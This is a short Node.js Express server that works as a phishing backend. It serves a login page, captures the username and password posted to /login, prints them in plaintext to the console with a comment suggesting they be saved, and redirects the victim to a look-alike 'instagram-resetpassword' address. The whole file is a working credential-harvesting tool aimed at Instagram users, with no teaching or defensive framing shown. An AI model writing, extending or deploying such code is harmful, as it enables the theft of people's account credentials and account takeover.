const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like HTML, CSS, JS, images)
app.use(express.static('public'));

// Serve the login page when accessing the root URL
app.get('/', (req, res) => {
    console.log('Sending login page...');
    res.sendFile(__dirname + '/public/login.html');  // Adjust if needed
});

// Handle form submission
app.post('/login', (req, res) => {
    // Log the entire body to see if we are capturing the data
    console.log('Form data received:', req.body);

    const { username, password } = req.body;
    if (username && password) {
        console.log(`Received login request with username: ${username} and password: ${password}`);
    } else {
        console.log('Username or password is missing!');
    }

    // You can save or process the credentials here
    // For demonstration purposes, we will redirect to Instagram
    res.redirect('https://instagram-resetpassword.vercel.app/'); // Redirect to desired destination
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
